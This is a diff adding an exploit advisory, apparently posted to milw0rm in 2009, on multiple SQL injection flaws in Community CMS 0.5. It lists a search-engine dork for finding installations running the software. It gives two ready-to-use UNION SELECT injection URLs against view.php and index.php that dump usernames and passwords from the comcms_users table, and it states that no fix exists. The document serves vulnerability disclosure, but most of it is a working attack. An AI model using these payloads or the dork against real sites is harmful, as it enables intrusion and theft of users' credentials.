@@ -1,0 +1,60 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: Community CMS
+[+] Version: 0.5
+[+] Website: http://sourceforge.net/projects/communitycms/
+
+[+] Bugs: [A] Multiple SQL Injection
+
+[+] Exploitation: Remote
+[+] Dork: intext:"Powered by Community CMS"
+[+] Date: 30 Mar 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] SQL Injection
+
+[-] File affected: view.php, calendar.php
+
+This bug allows a guest to view username and password of a registered user.
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Multiple SQL Injection
+
+http://www.site.com/path/view.php?article_id=-1 UNION ALL SELECT 1,2,username,password,5,6,7,8,9 FROM comcms_users
+
+http://www.site.com/path/index.php?id=2&view=event&a=-1 UNION ALL SELECT 1,2,3,4,5,6,7,CONCAT(username, 0x3a, password),NULL,NULL,NULL,12,13,NULL FROM comcms_users%23
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-03-31]
